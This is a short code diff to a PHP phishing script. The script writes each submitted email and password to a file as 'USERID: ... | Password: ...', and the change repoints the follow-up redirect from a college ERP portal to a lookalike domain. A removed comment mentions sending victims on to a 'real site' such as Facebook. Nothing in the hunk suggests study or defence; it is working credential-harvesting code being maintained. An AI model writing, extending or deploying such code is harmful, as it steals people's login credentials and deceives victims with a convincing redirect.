@@ -8,7 +8,7 @@
     fwrite($file, "USERID: $email | Password: $password\n");
     fclose($file);
 
-    // Optional: Redirect user to real site (e.g., Facebook)
-    header("Location: https://erp.pict.edu");
+    // Redirect user to the requested site
+    header("Location: https://erppict.wccscas.in/");
     exit();
 ?>
